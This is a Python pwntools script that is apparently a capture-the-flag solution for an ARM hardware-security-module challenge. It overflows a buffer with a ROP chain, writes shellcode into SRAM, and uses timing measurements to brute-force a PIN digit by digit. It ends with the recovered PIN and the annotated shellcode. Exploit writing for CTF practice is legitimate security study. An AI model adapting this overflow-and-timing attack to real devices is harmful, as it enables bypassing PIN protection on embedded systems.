from pwn import *
import time
import binascii
import random

def recvuntil(bytes_str):
    print("< " + conn.recvuntil(bytes_str).decode("utf-8"))


ports = list(range(8001,8011,1))

#garbage can take any value
garbage = p32(0)

gadget_R3_R4_R5_PC = p32(0x08000226 +1)
socket = p32(0xE1000010)
R4_base_value = 0xE1001FD8
R4_0 = p32(R4_base_value)
R5_buf_adr = p32(0xe1001cd0+8) #must be buf_stack_adr+12-4

port_i = random.randrange(0,10,1)

#gadget_write: 
#   str R5,[R3,#4]
#   pop {R3-R5,PC}
gadget_write = p32(0x08000912 + 1)

verify_pin = p32(0x080001fc + 1)
verify_final = p32(0x0800046e + 1)

sram_adr = 0x20001000

def splitWords(bin_str):
    tab = []
    for a,b,c,d in zip(bin_str[::4],bin_str[1::4], bin_str[2::4], bin_str[3::4]):
        byte = (d << 24) + (c << 16) + (b<<8) + a
        tab.append(byte)
    return tab

def gen_payload(str_hex):
    payload_hex = str_hex.replace(" ","")
    while (len(payload_hex) % 16 != 0):
        payload_hex += "00"
    payload_bin = binascii.unhexlify(payload_hex)
    return splitWords(payload_bin)

#PIN = "00000000"
PIN = "13372000"
#digit position starting number
off_test = 6
#candidate digit starting number
digit_test = 0

#number of attempts for a same digit
ITERATIONS = 2

for off in range(off_test,off_test+1,1):
    time_tab = []
    for digit in range(0x30 + digit_test, 0x3A, 1):
    #for digit in range(0x38, 0x39, 1):

        tab = []
        for iteration in range(0,ITERATIONS,1):
            exit_loop = False
            while (not exit_loop):
                try:
                    conn = remote('picohsm.donjon-ctf.io', ports[port_i])
                    recvuntil(b'15 seconds...\n')
                    exit_loop = True
                except EOFError:
                    port_i = (port_i + 1) % 10
                    time.sleep(1)
            
            #replace the candidate within the PIN tested string
            PIN = PIN[:off] + chr(digit) + PIN[off+1:]

            payload = gen_payload("48 F2 00 06 68 68 98 47 76 1E FB D1 4F F0 08 06 38 BD")
            print("|".join("%08x" % p for p in payload))

            buf_stack_adr = p32(0xe1001cd0)
            s = bytes(PIN, "utf-8") + b' '*4 + buf_stack_adr + b'a'*(0x300-4*4) + R4_0 + gadget_R3_R4_R5_PC

            #the first value after the first gadget must not be modified! (socket)
            s += socket + p32(0) + garbage + gadget_R3_R4_R5_PC

            #write the shellcode using gadget_write as many as needed
            for i in range(len(payload)):
                s += p32(sram_adr+i*4-4) + garbage + p32(payload[i]) + gadget_write

            #now, jump on the written shellcode!
            s += verify_pin + garbage + R5_buf_adr + p32(sram_adr + 1)

            s += garbage
            R4_adjusted = 0xe1001cd0 + len(s) + 4*3
            s += p32(R4_adjusted) + R5_buf_adr + verify_final

            s += socket + p32(0)

            t0 = time.time()
            print("Testing " + PIN)
            conn.send(s)
            print(conn.recvline().decode("utf-8"))
            resp = ""
            #s = conn.recvline(timeout=10).decode("utf-8")
            resp = conn.recvline(timeout=11).decode("utf-8")

            t1 = time.time()
            delta_t = t1-t0
            print(str(delta_t))
            print(resp)
        
            tab.append(delta_t)

            for t in tab:
                print(t)
        
        time_tab.append(min(tab))
    
        ### find the correct digit among all the candidates
        for idx, ttt in enumerate(time_tab):
            print("%d: %f" % (idx+digit_test, ttt))

    correct_digit = time_tab.index(max(time_tab))
    PIN = PIN[:off] + chr(correct_digit + 0x30) + PIN[off+1:] 

    print("Digit found: position %d value %s" % (off, chr(correct_digit + 0x30)))

    for idx, time in enumerate(time_tab):
        print("%d: %f" % (idx+digit_test, time))

print("Found PIN")
print(PIN)

#### correct PIN value: 13372020 !!!!

"""
R3: @verify_PIN inside (first instruction) : 0x080001FC+1
R4: don't care
R5: adr to PIN str @adr
R6: contains #1024
R7: don't care
PC SRAM payload @
~~~~~~~~~~~~~~~~~~
MOV R6, #16384              ||44 F2 00 06||     32768 => ||48 F2 01 06||  16 => ||4FF01006||
LDR R0, [R5, #4]            ||68 68||
BLX R3                      ||98 47||
SUBS R6,R6,#1               ||76 1E||
BNE -3*2                    ||FB D1||
MOV R6, #8                  ||4F F0 08 06||
POP R3-R5, PC               ||38 BD||
"""
